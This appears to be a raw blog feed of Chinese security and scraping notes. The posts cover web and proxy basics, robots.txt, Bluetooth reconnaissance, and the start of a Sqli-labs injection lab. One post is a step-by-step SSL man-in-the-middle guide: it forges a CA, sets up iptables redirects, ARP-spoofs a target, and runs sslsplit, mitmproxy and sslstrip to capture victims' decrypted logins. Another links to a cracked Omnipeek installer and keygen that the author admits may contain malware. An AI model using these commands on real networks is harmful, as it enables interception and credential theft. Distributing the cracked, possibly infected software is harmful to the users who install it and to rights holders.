<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>This is a Demo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;wrapper&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;text&quot;</span>&gt;</span>Hello, this is a paragraph.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="动态网页"><a href="#动态网页" class="headerlink" title="动态网页"></a>动态网页</h3><p>动态网页非常灵活多变</p>
<p>我们现在遇到的大多数网站都是动态网站，它们不再是一个简单的 HTML，而是可能由 JSP、PHP、Python 等语言编写的，其功能比静态网页强大和丰富太多了</p>
<h2 id="无状态-HTTP"><a href="#无状态-HTTP" class="headerlink" title="无状态 HTTP"></a>无状态 HTTP</h2><p>就是当我们向服务器发送请求后，服务器解析此请求，然后返回对应的响应， HTTP 协议对事务处理是没有记忆能力的，然后就出现了会话和 Cookies</p>
<h2 id="会话"><a href="#会话" class="headerlink" title="会话"></a>会话</h2><p>会话比如比如，打电话时，没有挂断电话这中间的一系列过程可以称为一个会话</p>
<p>而在 Web 中，会话对象用来存储特定用户会话所需的属性及配置信息，而这个用户保持到信息会在服务器一直保存下去</p>
<h2 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h2><p>Cookies 指某些网站为了辨别用户身份、进行会话跟踪而存储在用户本地终端上的数据。</p>
<h2 id="会话-Cookie-和持久-Cookie"><a href="#会话-Cookie-和持久-Cookie" class="headerlink" title="会话 Cookie 和持久 Cookie"></a>会话 Cookie 和持久 Cookie</h2><ul>
<li><p>会话 Cookie 就是把 Cookie 放在浏览器内存里，浏览器在关闭之后该 Cookie 即失效</p>
</li>
<li><p>持久 Cookie 则会保存到客户端的硬盘中，下次还可以继续使用，用于长久保持用户登录状态</p>
</li>
</ul>
<h1 id="代理的基本原理"><a href="#代理的基本原理" class="headerlink" title="代理的基本原理"></a>代理的基本原理</h1><p>形象地说，它是网络信息的中转站。在我们正常请求一个网站时，是发送了请求给 Web 服务器，Web 服务器把响应传回给我们。如果设置了代理服务器，实际上就是在本机和服务器之间搭建了一个桥</p>
<h2 id="根据协议区分"><a href="#根据协议区分" class="headerlink" title="根据协议区分"></a>根据协议区分</h2><ul>
<li><strong>FTP 代理服务器</strong>：主要用于访问 FTP 服务器，一般有上传、下载以及缓存功能，端口一般为 21、2121 等。</li>
<li><strong>HTTP 代理服务器</strong>：主要用于访问网页，一般有内容过滤和缓存功能，端口一般为 80、8080、3128 等。</li>
<li><strong>SSL/TLS 代理</strong>：主要用于访问加密网站，一般有 SSL 或 TLS 加密功能（最高支持 128 位加密强度），端口一般为 443。</li>
<li><strong>RTSP 代理</strong>：主要用于访问 Real 流媒体服务器，一般有缓存功能，端口一般为 554。</li>
<li><strong>Telnet 代理</strong>：主要用于 telnet 远程控制（黑客入侵计算机时常用于隐藏身份），端口一般为 23。</li>
<li><strong>POP3/SMTP 代理</strong>：主要用于 POP3/SMTP 方式收发邮件，一般有缓存功能，端口一般为 110/25。</li>
<li><strong>SOCKS 代理</strong>：只是单纯传递数据包，不关心具体协议和用法，所以速度快很多，一般有缓存功能，端口一般为 1080。SOCKS 代理协议又分为 SOCKS4 和 SOCKS5，前者只支持 TCP，而后者支持 TCP 和 UDP，还支持各种身份验证机制、服务器端域名解析等。简单来说，SOCK4 能做到的 SOCKS5 都可以做到，但 SOCKS5 能做到的 SOCK4 不一定能做到。</li>
</ul>
<h2 id="根据匿名程度区分"><a href="#根据匿名程度区分" class="headerlink" title="根据匿名程度区分"></a>根据匿名程度区分</h2><ul>
<li><strong>高度匿名代理</strong>：会将数据包原封不动地转发，在服务端看来就好像真的是一个普通客户端在访问，而记录的 IP 是代理服务器的 IP。</li>
<li><strong>普通匿名代理</strong>：会在数据包上做一些改动，服务端上有可能发现这是个代理服务器，也有一定几率追查到客户端的真实 IP。代理服务器通常会加入的 HTTP 头有 <code>HTTP_VIA</code> 和 <code>HTTP_X_FORWARDED_FOR</code>。</li>
<li><strong>透明代理</strong>：不但改动了数据包，还会告诉服务器客户端的真实 IP。这种代理除了能用缓存技术提高浏览速度，能用内容过滤提高安全性之外，并无其他显著作用，最常见的例子是内网中的硬件防火墙。</li>
<li><strong>间谍代理</strong>：指组织或个人创建的用于记录用户传输的数据，然后进行研究、监控等目的的代理服务器。</li>
</ul>
<h2 id="常见代理设置"><a href="#常见代理设置" class="headerlink" title="常见代理设置"></a>常见代理设置</h2><p>我自己用的是机场</p>
]]></content>
      <categories>
        <category>Python爬虫</category>
      </categories>
      <tags>
        <tag>Python爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>SSL中间人攻击</title>
    <url>/2020/03/10/SSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p>任务104：SSL、TLS中间人攻击</p>
<p><strong>下面是攻击原理</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200115173502239.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="在这里插入图片描述"></p>
<h2 id="开-始-实-验"><a href="#开-始-实-验" class="headerlink" title="开 始 实 验"></a>开 始 实 验</h2><p>下面开始演示</p>
<h2 id="1-先利用openssl先生成伪造证书"><a href="#1-先利用openssl先生成伪造证书" class="headerlink" title="1.先利用openssl先生成伪造证书"></a>1.先利用openssl先生成伪造证书</h2><ol>
<li>生成证书 需要两步</li>
</ol>
<p><strong>先利用openssl生成一个证书的私钥</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl genrsa -out ca.key 2048   		</span><br></pre></td></tr></table></figure>
<p>后面2048位是长度还有4096位<br>    <img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200115173857404.png" alt="在这里插入图片描述"><br>    生成出来的文件<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200115173926356.png" alt="在这里插入图片描述"></p>
<p><strong>1.2. 在用上面私钥生成证书</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl req -new -x509 -days 200 -key ca.key -out ca.crt	</span><br></pre></td></tr></table></figure>
<p><strong>-x509</strong>是证书格式        <strong>200</strong>是天这个证书有效时间  <strong>ca.key</strong>是要用到的私钥这个密钥就是上面生成出来的       <strong>ca.crt</strong>生成的证书<br><strong>需要叫你填写</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020011517453038.png" alt="在这里插入图片描述"></p>
<h2 id="2-启动路由功能"><a href="#2-启动路由功能" class="headerlink" title="2.启动路由功能"></a>2.启动路由功能</h2><ol start="2">
<li>启动后他会将客户端发来的数据包的地址进行转发，可以当作一个路由器使用不然ARP欺骗后客户端就不能利用我的电脑访问服务器了<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sysctl -w net.ipv4.ip_forward&#x3D;1</span><br></pre></td></tr></table></figure></li>
</ol>
<p><strong>上面意思是叫这个net.ipv4.ip_forward参数设置成1</strong></p>
<h2 id="3-用Iptables端口转发规则和sslscan工具进行中间人攻击"><a href="#3-用Iptables端口转发规则和sslscan工具进行中间人攻击" class="headerlink" title="3. 用Iptables端口转发规则和sslscan工具进行中间人攻击"></a>3. 用Iptables端口转发规则和sslscan工具进行中间人攻击</h2><ol start="3">
<li></li>
</ol>
<p><strong>为什么要端口转发那？，就是叫80和443端口还有好多加密的端口收到的包，全部都转发到另外一个端口上，这个端口就是伪造证书解密类型的工具上</strong></p>
<p><strong>3.1.空表和查看表有没有配置好的表</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -t nat -L </span><br></pre></td></tr></table></figure>
<p><strong>-t是指定表  -L是查看 意思就是nat 表有没有端口转发规则</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200115175800987.png" alt="在这里插入图片描述"><br><strong>3.2.清空表</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -t nat -F</span><br></pre></td></tr></table></figure>

<p><strong>-t是指定表 -F 是清空表意思就是清空nat表</strong></p>
<p>3.3. 端口转发规则配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080		#这个是http</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443	 #这个是https</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443	 #这个是MSA</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443 	#这个是SMTPS</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443	 #这个是IMAPS</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443	 #这个是POP3S</span><br></pre></td></tr></table></figure>
<p>上面意思是<br>-t 是使用的那个表<br>-A PREROUTING 是路由之前就生效的<br>-t    tcl  –dport 80     -j REDIRECT –to-ports 8080 就是客户端发给我的是tcl协议去往80端口都会重定向给8080<br>里面为什么有8443应为sslscan工具可以进行多个端口  ，还有可以解密多个协议MSA，SMTP，SIMAPS，POP3S</p>
<p>可以查看一下用上面的命令<code>iptables -t nat -L</code><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200115184701512.png" alt="在这里插入图片描述"><br><strong>3.4. ARP欺骗</strong><br>应为需要叫目标请求发送给我</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">arpspoof -i eth0 -t 目标的ip -r 网关</span><br></pre></td></tr></table></figure>
<p><strong>3.5.</strong> <strong>使用sslscan进行SSL中间人攻击</strong><br>先创建一个文件夹<br>mkdir -p test/logdir<br><strong>启动sslscan</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sslsplit -D -l connect.log -j &#x2F;root&#x2F;test -S &#x2F;root&#x2F;test&#x2F;logdir&#x2F; -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</span><br></pre></td></tr></table></figure>
<p><strong>上面命令的意思</strong><br><strong>-D</strong>    就是查看详细信息<br>**-l  connect.log** 连接信息都会记录到connect.log文件里<br>**-j  /root/test**         跟目录<br>**-s   /root/test/logdir/**          请求都在这个logdir/目录里面<br>**-k ca.key**            指定私钥ca.key文件（上面生成出来的）<br>**-c ca.crt**            指定证书ca.crt    文件（上面生成出来的）<br><strong>ssl 0.0.0.0 8443</strong> 加密的请求在8443端口侦听<br><strong>tcp 0.0.0.0 8080</strong> 不加密的请求在8080端口监听<br>运行上面命令就启动了<img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200115194010700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="在这里插入图片描述"><br><strong>被攻击的电脑访问网络就会出现这个情况</strong><br><strong>在目标访问https的网站就会出现证书错误这个还是有可能是中间攻击的特征</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/202001152004531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>被攻击端电脑可以看见证书不一样<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200115202352957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在浏览器登录账号密码</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200115201241173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>目标所有的请求和访问在保存在 /root/test/logdir/ 里<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200115201923746.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>看一下文件内容可以看见请求内容已经被解密了<br>应为网站安全有的密码被也被加密组件进行加密了还是看不到密码</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200115202109649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="其他工具实现SSL中间人攻击"><a href="#其他工具实现SSL中间人攻击" class="headerlink" title="其他工具实现SSL中间人攻击"></a>其他工具实现SSL中间人攻击</h2><ol>
<li>Mitmproxy工具使用<br>和sslscan工具是以类的工具<br>他支持8080侦听<br>使用Iptables端口转发规则只能转发到8080上了<br>查看有没有配置好的命令<code>iptables -t nat -L</code><br>清除配置的<code>iptables -t nat -F</code>这两个上面已说了</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080		#这个是http</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8080	 #这个是https</span><br></pre></td></tr></table></figure>
<ol>
<li>启动Mitmproxy</li>
</ol>
<p>mitmproxy -T –host -w mitmproxy.log</p>
<ol start="2">
<li>sslstrip工具使用进行SSL中间人攻击<br> 我们访问https网站的时候就算你不加上https的话服务器也会给你强制加上httos<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020011520583627.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ol>
<p>黑客在发送给服务器sslstrip工具就给他还换成https的请求了</p>
<p>还是要指定端口</p>
<p>应为这个工具也是只能监听一个端口<br>查看清除配置就不说了上面有</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080		#这个是http</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8080	 #这个是https</span><br></pre></td></tr></table></figure>
<p><strong>启动sslstrip工具</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sslstrip -l 8080</span><br></pre></td></tr></table></figure>
<p>-l    是指定监听的端口<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200115210307478.png" alt="在这里插入图片描述"></p>
<p>目标电脑访问https网站的就会变成了http的了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200115210551120.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>目标电脑登陆账号密码</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200115211230450.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>然后黑客我就可以进行查看你请求的信息和账号密码了</strong><br><strong>网站比较安全的还要用组件进行密码的加密有的密码可能还是被加密了这个是属于正常情况</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200115211623557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>数据嗅探</category>
      </categories>
      <tags>
        <tag>数据嗅探</tag>
      </tags>
  </entry>
  <entry>
    <title>Robots 协议</title>
    <url>/2021/02/12/Robots/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><div class="note warning simple"><p>笔记[Python3 网络爬虫开发实战] 3.1.4 - 分析 Robots 协议</p>
</div>



<h1 id="Robots-协议介绍"><a href="#Robots-协议介绍" class="headerlink" title="Robots 协议介绍"></a>Robots 协议介绍</h1><div class="note info simple"><p>Robots协议用来告知搜索引擎哪些页面能被抓取，哪些页面不能被抓取，可以屏蔽一些网站中比较大的文件，如：图片，音乐，视频等，节省服务器带宽</p>
</div>

<div class="note info simple"><p>它通常是一个叫作 robots.txt 的文本文件，一般放在网站的根目录下。</p>
</div>

<div class="note info simple"><p>互联网的搜索引擎，他们会检查你的根目录下是否存在 robots.txt 文件</p>
<ol>
<li>如果存在，搜索爬虫会根据其中定义的爬取范围来爬取</li>
<li>如果没有找到这个文件，搜索爬虫便会访问所有可直接访问的页面</li>
</ol>
</div>

<h1 id="爬取规则"><a href="#爬取规则" class="headerlink" title="爬取规则"></a>爬取规则</h1><div class="note info simple"><p>下面是常用的规定语法</p>
</div>

<table>
<thead>
<tr>
<th align="center">语法规则</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>User-agent</code></td>
<td align="center">描述了搜索爬虫的名称比如：Baiduspider</td>
</tr>
<tr>
<td align="center"><code>Disallow</code></td>
<td align="center">指定了不允许抓取的目录</td>
</tr>
<tr>
<td align="center"><code>Allow</code></td>
<td align="center">和 <code>Disallow</code> 一起使用，一般不会单独使用用来排除某些限制</td>
</tr>
</tbody></table>
<p>下面我们看一个 robots.txt 的样例：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /</span><br><span class="line">Allow: /public/</span><br></pre></td></tr></table></figure>
<div class="note info simple"><ol>
<li><code>User-agent</code>：上面这个*就是全部的搜索引擎都可以爬</li>
<li><code>Disallow: /</code>：指定了不允许抓取的目录</li>
<li><code>Allow: /public/</code>：只允许爬/public/目录下的</li>
</ol>
</div>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow:</span><br></pre></td></tr></table></figure>
<div class="note info simple"><p>上面的意思允许所有爬虫访问任何目录</p>
</div>

<div class="note danger simple"><p>另外，直接把 robots.txt 文件留空也是可以的</p>
</div>





<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-agent: * </span><br><span class="line">Disallow: &#x2F;</span><br></pre></td></tr></table></figure>
<div class="note info simple"><p>上面的意思禁止所有爬虫访问任何目录</p>
</div>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;private&#x2F;</span><br><span class="line">Disallow: &#x2F;tmp&#x2F;</span><br></pre></td></tr></table></figure>
<div class="note info simple"><p>上面的意思禁止所有爬虫访问网站某些目录</p>
</div>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-agent: BaiduSpider</span><br><span class="line">Disallow:</span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;</span><br></pre></td></tr></table></figure>
<div class="note info simple"><p>上面的意思只允百度一个爬虫访问</p>
</div>

<p>网址爬虫名字</p>
<ol>
<li><code>BaiduSpider</code>百度<a href="http://www.baidu.com/">www.baidu.com</a></li>
<li><code>Googlebot</code>谷歌<a href="http://www.google.com/">www.google.com</a></li>
<li><code>360Spider</code>360 搜索<a href="http://www.so.com/">www.so.com</a></li>
<li><code>YodaoBot</code>有道<a href="http://www.youdao.com/">www.youdao.com</a></li>
<li><code>ia_archiver</code>Alexa<a href="http://www.alexa.cn/">www.alexa.cn</a></li>
<li><code>Scooter</code>altavista<a href="http://www.altavista.com/">www.altavista.com</a></li>
</ol>
<h1 id="看一下百度的"><a href="#看一下百度的" class="headerlink" title="看一下百度的"></a>看一下百度的</h1><p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210212174744323.png" alt="image-20210212174744323"> </p>
]]></content>
      <categories>
        <category>网络协议</category>
      </categories>
      <tags>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title>Savvius Omnipeek破解版汉化版下载和安装</title>
    <url>/2020/11/03/Savvius%20Omnipeek%E7%A0%B4%E8%A7%A3%E7%89%88%E6%B1%89%E5%8C%96%E7%89%88%E4%B8%8B%E8%BD%BD%E5%92%8C%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="下载Omnipeek"><a href="#下载Omnipeek" class="headerlink" title="下载Omnipeek"></a>下载Omnipeek</h2><p>我这个是在百度上下载的找了有的是Omnipeek不是能用有的是注册机不能用，很多我整合了一下是能用的，<strong>不知道有没有毒</strong><br>下载地址因为百度云盘下载的慢我把文件放到蓝奏云上了，分成多份，下载好文件名改成下面这样<br>蓝奏云下载地址<a href="https://wwx.lanzoux.com/b0bqwuwjg">https://wwx.lanzoux.com/b0bqwuwjg</a>密码:b4me<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201103085618.png"></p>
<p><strong>如果不会解压或者解压出错到百度云下载</strong><br>百度云下载地址<a href="https://pan.baidu.com/s/1OA49c7xdlN0DC-2WcgWH_g">https://pan.baidu.com/s/1OA49c7xdlN0DC-2WcgWH_g</a>提取码: 7ikd</p>
<h2 id="Omnipeek的安装"><a href="#Omnipeek的安装" class="headerlink" title="Omnipeek的安装"></a>Omnipeek的安装</h2><p>打开Savvius Omnipeek11.01.msi<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/2020-11-035.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/2020-11-02_170830.png"><br>打开注册机</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/2020-11-02_172420.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/2020-11-02_172719.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/2020-11-02_172739.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/2020-11-02_172809.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/2020-11-02_172844.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/2020-11-02_172906.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/2020-11-02_173028.png"></p>
<h2 id="设置中文"><a href="#设置中文" class="headerlink" title="设置中文"></a>设置中文</h2><p>叫汉化文件放在1033文件里面<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201103091436.png"></p>
<h2 id="安装完的效果"><a href="#安装完的效果" class="headerlink" title="安装完的效果"></a>安装完的效果</h2><p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201103091611.png"></p>
]]></content>
      <categories>
        <category>工具安装</category>
        <category>SavviusOmnipeek</category>
      </categories>
      <tags>
        <tag>安装</tag>
      </tags>
  </entry>
  <entry>
    <title>Spooftooph蓝牙欺骗工具使用</title>
    <url>/2021/03/04/Spooftooph/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h1 id="linux的蓝牙操作"><a href="#linux的蓝牙操作" class="headerlink" title="linux的蓝牙操作"></a>linux的蓝牙操作</h1><div class="note warning simple"><p><code>Spooftooph</code>的工具在国内没有人写过详细使用这个工具的文章，今天我闲着没事就写一下这个工具的使用</p>
<p><code>Spooftooph</code>kali自带</p>
</div>

<div class="note info simple"><p>我们可以用<code>hciconfig</code>命令查看，打印出有关系统内安装的所有蓝牙设备的名称及基本信息</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210305093634767.png" alt="image-20210305093634767"></p>
<p>如果没有运行可以用下面这个命令启动他</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hciconfig 设备名 up</span><br></pre></td></tr></table></figure>


<p>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl start bluetooth  </span><br></pre></td></tr></table></figure>
<div class="note info simple"><p>hcitool命令来扫描附近的蓝牙设备</p>
</div>

<p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hcitool scan</span><br></pre></td></tr></table></figure>
<p><code>scan</code>参数扫描附近的蓝牙设备</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210305095343932.png" alt="image-20210305095343932"></p>
<p>也可以通过mac地址查看设备名字命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hcitool name 设备的mac地址</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210305101109085.png" alt="image-20210305101109085"></p>
<div class="note info simple"><p><code>sdptool</code>命令查看所提供的所有服务</p>
</div>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sdptool browse  设备mac地址</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210305101827385.png" alt="image-20210305101827385"></p>
<h1 id="更新中。。。"><a href="#更新中。。。" class="headerlink" title="更新中。。。"></a>更新中。。。</h1>]]></content>
      <categories>
        <category>黑客工具使用</category>
        <category>Spooftooph</category>
      </categories>
      <tags>
        <tag>Spooftooph蓝牙欺骗工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqli-labs Less1-4关卡</title>
    <url>/2020/07/17/Sqli-labs%20Less1-4%E5%85%B3%E5%8D%A1/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="Less1"><a href="#Less1" class="headerlink" title="Less1"></a>Less1</h2><ol>
<li>开始<br>打开 Less1可以看到是这样的<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200717121331814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入<br><code>http://192.168.43.90/Less-1/?id=1</code><br>sql语句是<code>SELECT * FROM users WHERE id=&#39; 1&#39; LIMIT 0,1</code><br>可以看到有显示<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020071712150230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入<br><code>http://192.168.43.90/Less-1/?id= 1 &#39;</code><br>sql语句是<code>SELECT * FROM users WHERE id=&#39; 1&#39;&#39; LIMIT 0,1</code><br>发现错了存在sql注入漏洞<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020071712155954.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ol>
